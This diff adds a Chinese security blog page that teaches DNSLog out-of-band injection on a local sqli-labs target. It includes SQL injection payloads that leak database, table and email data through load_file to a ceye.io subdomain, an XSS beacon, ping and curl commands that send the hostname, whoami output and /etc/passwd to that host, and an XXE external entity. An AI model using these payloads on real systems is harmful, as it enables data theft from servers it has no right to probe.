@@ -1,0 +1,518 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="0x01 什么是DNSlog注入DNSlog注入，也叫DNS带外查询，它是属于带外通信的一种(Out of Band,简称OOB)。 寻常的注入基本都是在同一个信道上面的，比如正常的get注入，先在url上插入payload做HTTP请求，然后得到HTTP返回包，没有涉及其他信道。而所谓的带外通信，至少涉及两个信道  信道：在计算机中指通信的通道，是信号传输的媒介。  0x02 DNS注入原理 攻">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DNSLog注入">
+<meta property="og:url" content="https://www.anch0r.top/2022/04/10/DNSLog%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="杰同学的自留地">
+<meta property="og:description" content="0x01 什么是DNSlog注入DNSlog注入，也叫DNS带外查询，它是属于带外通信的一种(Out of Band,简称OOB)。 寻常的注入基本都是在同一个信道上面的，比如正常的get注入，先在url上插入payload做HTTP请求，然后得到HTTP返回包，没有涉及其他信道。而所谓的带外通信，至少涉及两个信道  信道：在计算机中指通信的通道，是信号传输的媒介。  0x02 DNS注入原理 攻">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20220410183310635-1680762880370-6.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20220410182005256.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20220410212338598.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20220410184649040.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20220410185033571.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20220410185729538.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20220410190627252.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20220410191656744.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20220410231848105.png">
+<meta property="article:published_time" content="2022-04-10T15:22:20.000Z">
+<meta property="article:modified_time" content="2023-12-17T07:21:34.000Z">
+<meta property="article:author" content="anch0r">
+<meta property="article:tag" content="DNSLog">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20220410183310635-1680762880370-6.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>DNSLog注入</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2022/04/20/NFS%E9%83%A8%E7%BD%B2/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://www.anch0r.top/2022/04/10/DNSLog%E6%B3%A8%E5%85%A5/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://www.anch0r.top/2022/04/10/DNSLog%E6%B3%A8%E5%85%A5/&text=DNSLog注入"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://www.anch0r.top/2022/04/10/DNSLog%E6%B3%A8%E5%85%A5/&title=DNSLog注入"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://www.anch0r.top/2022/04/10/DNSLog%E6%B3%A8%E5%85%A5/&is_video=false&description=DNSLog注入"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=DNSLog注入&body=Check out this article: https://www.anch0r.top/2022/04/10/DNSLog%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://www.anch0r.top/2022/04/10/DNSLog%E6%B3%A8%E5%85%A5/&title=DNSLog注入"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://www.anch0r.top/2022/04/10/DNSLog%E6%B3%A8%E5%85%A5/&title=DNSLog注入"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://www.anch0r.top/2022/04/10/DNSLog%E6%B3%A8%E5%85%A5/&title=DNSLog注入"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://www.anch0r.top/2022/04/10/DNSLog%E6%B3%A8%E5%85%A5/&title=DNSLog注入"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://www.anch0r.top/2022/04/10/DNSLog%E6%B3%A8%E5%85%A5/&name=DNSLog注入&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://www.anch0r.top/2022/04/10/DNSLog%E6%B3%A8%E5%85%A5/&t=DNSLog注入"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E4%BB%80%E4%B9%88%E6%98%AFDNSlog%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">0x01 什么是DNSlog注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-DNS%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">0x02 DNS注入原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF%E5%92%8C%E6%9D%A1%E4%BB%B6"><span class="toc-number">3.</span> <span class="toc-text">0x03 使用场景和条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E9%85%8D%E5%90%88sql%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">0x04 配合sql注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E9%85%8D%E5%90%88%E5%85%B6%E4%BB%96%E6%94%BB%E5%87%BB"><span class="toc-number">5.</span> <span class="toc-text">0x05 配合其他攻击</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        DNSLog注入
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">anch0r</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-04-10T15:22:20.000Z" class="dt-published" itemprop="datePublished">2022-04-10</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/DNSLog/" rel="tag">DNSLog</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="0x01-什么是DNSlog注入"><a href="#0x01-什么是DNSlog注入" class="headerlink" title="0x01 什么是DNSlog注入"></a>0x01 什么是DNSlog注入</h2><p>DNSlog注入，也叫DNS带外查询，它是属于带外通信的一种(Out of Band,简称OOB)。</p>
+<p>寻常的注入基本都是在同一个信道上面的，比如正常的get注入，先在url上插入payload做HTTP请求，然后得到HTTP返回包，没有涉及其他信道。而所谓的带外通信，至少涉及两个信道</p>
+<blockquote>
+<p>信道：在计算机中指通信的通道，是信号传输的媒介。</p>
+</blockquote>
+<h2 id="0x02-DNS注入原理"><a href="#0x02-DNS注入原理" class="headerlink" title="0x02 DNS注入原理"></a>0x02 DNS注入原理</h2><ol>
+<li><p>攻击者先向web服务器提交payload语句，比如（<code>select load_file(concat('\\\\','攻击语句',.XXX.ceye.io\\abc))</code>）</p>
+</li>
+<li><p>其中的攻击语句被放到数据库中会被执行，生成的结果与后面的<code>.XXX.ceye.io\\abc</code>构成一个新的域名</p>
+</li>
+<li><p>这时<code>load_file()</code>就可以发起请求，那么这一条带有数据库查询结果的域名就被提交到DNS服务器进行解析</p>
+</li>
+<li><p>此时，如果我们可以查看DNS服务器上的Dnslog就可以得到SQL注入结果。那么我们如何获得这条DNS查询记录呢？注意注入语句中的<code>ceye.io</code>，这其实是一个开放的Dnslog平台（具体用法在官网可见），在<code>ceye.io</code>上我们可以获取到有关<code>ceye.io</code>的DNS查询信息。实际上在域名解析的过程中，是由顶级域名向下逐级解析的，我们构造的攻击语句也是如此，当它发现域名中存在<code>ceye.io</code>时，它会将这条域名信息转到相应的NS服务器上，而通过<a target="_blank" rel="noopener" href="http://ceye.io我们就可以查询到这条dns解析记录./">http://ceye.io我们就可以查询到这条DNS解析记录。</a></p>
+<p>当然还有其他可以使用的DNSlog平台，如<a target="_blank" rel="noopener" href="http://www.dnslog.cn/%E3%80%82">http://www.dnslog.cn/。</a></p>
+<p>这里我就使用<a target="_blank" rel="noopener" href="http://ceye.io/">http://ceye.io</a>, 它是一个免费的记录dnslog的平台，注册后到Profile页面会给你一个二级域名：xxx.ceye.io,当我们把注入信息放到三级域名那里，后台的日志会记录下来。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20220410183310635-1680762880370-6.png" alt="http://ceye.io用户界面"></p>
+</li>
+</ol>
+<h2 id="0x03-使用场景和条件"><a href="#0x03-使用场景和条件" class="headerlink" title="0x03 使用场景和条件"></a>0x03 使用场景和条件</h2><p>sql的布尔型盲注、时间注入的效率普遍很低且当注入的线程太大容易被waf拦截，并且像一些命令执行，xss以及sql注入攻击有时无法看到回显结果，这时就可以考虑DNSlog注入攻击</p>
+<p>一共是这四个场景：</p>
+<ol>
+<li>SQL盲注</li>
+<li>命令执行（无回显）</li>
+<li>XSS（无回显）</li>
+<li>SSRF(无回显)</li>
+</ol>
+<p>但有个重要条件：<strong>load_file()函数可以使用。</strong></p>
+<p>也就是说需要配置文件my.ini中<code>secure_file_priv=</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20220410182005256.png" alt="secure_file_priv选项配置"></p>
+<blockquote>
+<p><strong>secure_file_priv配置说明</strong></p>
+<p>1、当secure_file_priv为空，就可以读取磁盘的目录。</p>
+<p>2、当secure_file_priv为G:\，就可以读取G盘的文件。</p>
+<p>3、当secure_file_priv为null，load_file就不能加载文件。</p>
+</blockquote>
+<p>在mysql命令行中使用<code>show variables like '%secure%';</code> 可以查看secure_file_priv的情况</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20220410212338598.png" alt="查看配置情况"></p>
+<p>值为空，说明可以使用load_file()函数</p>
+<p>另外还有几个注意事项：</p>
+<ul>
+<li><p>dnslog注入只能用于windows平台，因为load_file这个函数的主要目的还是读取本地的文件，所以我们在拼接的时候需要在前面加上两个//，这两个斜杠的目的是为了使用load_file可以查询的unc路径。但是Linux服务器没有<strong>unc</strong>路径，也就无法使用dnslog注入。</p>
+</li>
+<li><p>在进行注入的时候，需要先使用测试代码判断该位置是否存在注入，然后再在后面拼接代码，因为对照pyload进行输入的话，可能会出现dnslog网站接收不到的情况。</p>
+</li>
+<li><p>在域名的后面，我们需要拼接一个文件名，这是因为load_file函数只能请求文件，如果不加后面的文件名，同样无法得到显示。</p>
+</li>
+</ul>
+<blockquote>
+<p>以下内容摘自百度：</p>
+<p>什么是UNC路径？</p>
+<p>UNC(Universal Naming Convention),通用命名规则</p>
+<p>什么是UNC路径？UNC路径就是类似<code>\\softer</code>这样的形式的网络路径。</p>
+<p>UNC为网络（主要指局域网）上资源的完整Windows 2000名称。</p>
+<p>格式：<code>\\servername\sharename</code>，其中servername是服务器名。sharename是共享资源的名称。</p>
+<p>目录或文件的UNC名称可以包括共享名称下的目录路径，格式为：\servername\sharename\directory\filename。</p>
+</blockquote>
+<h2 id="0x04-配合sql注入"><a href="#0x04-配合sql注入" class="headerlink" title="0x04 配合sql注入"></a>0x04 配合sql注入</h2><p>这里我以sqlilabs靶场的lesson-8为例，是sql盲注，注入后不会有回显,那就用刚学的DNSlog来解决!!</p>
+<ul>
+<li>首先报库名：</li>
+</ul>
+<p>payload1:</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.3/Less-8/?id=1' and load_file(concat('\\\\',(select database()),'.xxx.ceye.io\\abc'))--+</span><br></pre></td></tr></tbody></table></figure>
+
+<p>说明：</p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">concat 可以拼接字符</span><br><span class="line">load_file()读取文件</span><br><span class="line">\\\\  有两个\用于转义，转义后代表\\</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20220410184649040.png" alt="示意图"></p>
+<p>在自己的ceye.io平台上查看DNSquery,发现解析记录，可以看到数据库名security</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20220410185033571.png" alt="结果回显"></p>
+<ul>
+<li>再报表名</li>
+</ul>
+<p>payload2：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.3/Less-8/?id=1' and load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema=database() limit 0,1),'.xxx.ceye.io\\abc'))--+</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p>可以看到一个emails表</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20220410185729538.png" alt="结果回显2"></p>
+<ul>
+<li>再报列名</li>
+</ul>
+<p>payload3:</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.3/Less-8/?id=1' and load_file(concat('\\\\',(select column_name from information_schema.columns where table_name='emails' limit 0,1),'.xxx.ceye.io\\abc'))--+</span><br></pre></td></tr></tbody></table></figure>
+
+<p>payload4:</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.3/Less-8/?id=1' and load_file(concat('\\\\',(select column_name from information_schema.columns where table_name='emails' limit 0,1),'.xxx.ceye.io\\abc'))--+</span><br></pre></td></tr></tbody></table></figure>
+
+<p>分别看到两个列</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20220410190627252.png" alt="结果回显3"></p>
+<ul>
+<li>报数据：</li>
+</ul>
+<p>因为在load_file里面不能使用@ ~等符号所以要区分数据我们可以先用group_ws()函数分割在用hex()函数转成十六进制即可 </p>
+<p>得到结果再转回去</p>
+<p>payload5:</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.3/Less-8/?id=1' and load_file(concat('\\\\',(select hex(concat_ws('~',id,email_id)) from emails limit 0,1),'.xxx.ceye.io\\abc'))--+</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20220410191656744.png" alt="结果回显4"></p>
+<p>以上就是DNSlog注入的全部流程</p>
+<p>注入期间我发现，可以将多个payload查询拼接在一起，比如如下注入方法：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.3/Less-8/?id=1' and load_file(concat('\\\\',(select database()),'.',(select version()),'.xxx.ceye.io\\abc'))--+</span><br></pre></td></tr></tbody></table></figure>
+
+<p>效果如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20220410231848105.png" alt="结果回显5"></p>
+<p>通式:</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.3/Less-8/?id=1' and load_file(concat('\\\\',(payload1),'.',(payload2),(......),'.xxx.ceye.io\\abc'))--+</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h2 id="0x05-配合其他攻击"><a href="#0x05-配合其他攻击" class="headerlink" title="0x05 配合其他攻击"></a>0x05 配合其他攻击</h2><ul>
+<li><strong>xss</strong></li>
+</ul>
+<p>除了SQL注入，DNSlog注入还可以配合其他漏洞使用，比如xss</p>
+<p>通过盲打，让触发者浏览器访问预设至的链接地址，如果盲打成功，会在平台上收到如下的链接访问记录：</p>
+<p>payload:<code>&gt;&lt;img src=http://xss.xxx.ceye.io/aaa&gt;</code>让src来请求我们的dnslog的平台</p>
+<ul>
+<li>命令执行</li>
+</ul>
+<p>说到命令执行，这里就要分windows平台和linux平台</p>
+<ol>
+<li>在windows平台，利用ping命令，有如下payload</li>
+</ol>
+<figure class="highlight cmd"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ping</span> <span class="variable">%COMPUTERNAME%</span>.xxx.ceye.io</span><br><span class="line">或者</span><br><span class="line"><span class="built_in">ping</span> <span class="variable">%USERNAME%</span>.xxx.ceye.io</span><br></pre></td></tr></tbody></table></figure>
+
+<p>执行成功，可以在dns平台上看到主机名或用户名</p>
+<ol start="2">
+<li>在linux平台，利用curl命令，有如下payload</li>
+</ol>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://ip.port.xxx.ceye.io/`<span class="built_in">whoami</span>`</span><br><span class="line">curl http://ip.port.xxx.ceye.io/`<span class="built_in">cat</span> /etc/passwd`</span><br></pre></td></tr></tbody></table></figure>
+
+<p>反引号中可以写入各种linux命令</p>
+<ul>
+<li>SSRF</li>
+</ul>
+<p>payload如下：</p>
+<figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">"http://ip.port.xxx.ceye.io/xxe_test"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>/&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>其实也算是和XXE配合使用</p>
+<p>以上这些payload都可以在<a target="_blank" rel="noopener" href="http://ceye.io/payloas">http://ceye.io/payloas</a> 中看到</p>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xhds/p/12322839.html">https://www.cnblogs.com/xhds/p/12322839.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Xiaoming0/p/13966667.html">https://www.cnblogs.com/Xiaoming0/p/13966667.html</a></p>
+
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E4%BB%80%E4%B9%88%E6%98%AFDNSlog%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">0x01 什么是DNSlog注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-DNS%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">0x02 DNS注入原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF%E5%92%8C%E6%9D%A1%E4%BB%B6"><span class="toc-number">3.</span> <span class="toc-text">0x03 使用场景和条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E9%85%8D%E5%90%88sql%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">0x04 配合sql注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E9%85%8D%E5%90%88%E5%85%B6%E4%BB%96%E6%94%BB%E5%87%BB"><span class="toc-number">5.</span> <span class="toc-text">0x05 配合其他攻击</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://www.anch0r.top/2022/04/10/DNSLog%E6%B3%A8%E5%85%A5/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://www.anch0r.top/2022/04/10/DNSLog%E6%B3%A8%E5%85%A5/&text=DNSLog注入"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://www.anch0r.top/2022/04/10/DNSLog%E6%B3%A8%E5%85%A5/&title=DNSLog注入"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://www.anch0r.top/2022/04/10/DNSLog%E6%B3%A8%E5%85%A5/&is_video=false&description=DNSLog注入"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=DNSLog注入&body=Check out this article: https://www.anch0r.top/2022/04/10/DNSLog%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://www.anch0r.top/2022/04/10/DNSLog%E6%B3%A8%E5%85%A5/&title=DNSLog注入"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://www.anch0r.top/2022/04/10/DNSLog%E6%B3%A8%E5%85%A5/&title=DNSLog注入"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://www.anch0r.top/2022/04/10/DNSLog%E6%B3%A8%E5%85%A5/&title=DNSLog注入"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://www.anch0r.top/2022/04/10/DNSLog%E6%B3%A8%E5%85%A5/&title=DNSLog注入"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://www.anch0r.top/2022/04/10/DNSLog%E6%B3%A8%E5%85%A5/&name=DNSLog注入&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://www.anch0r.top/2022/04/10/DNSLog%E6%B3%A8%E5%85%A5/&t=DNSLog注入"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2025
+    anch0r
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+      --><li><a href="/">首页</a></li><!--
+    --><!--
+      --><li><a href="/archives/">归档</a></li><!--
+    --><!--
+      --><li><a href="/categories/">categories</a></li><!--
+    --><!--
+      --><li><a href="/tags/">tags</a></li><!--
+    --><!--
+      --><li><a href="/about/">关于</a></li><!--
+    --><!--
+      --><li><a href="/search/">搜索</a></li><!--
+    -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
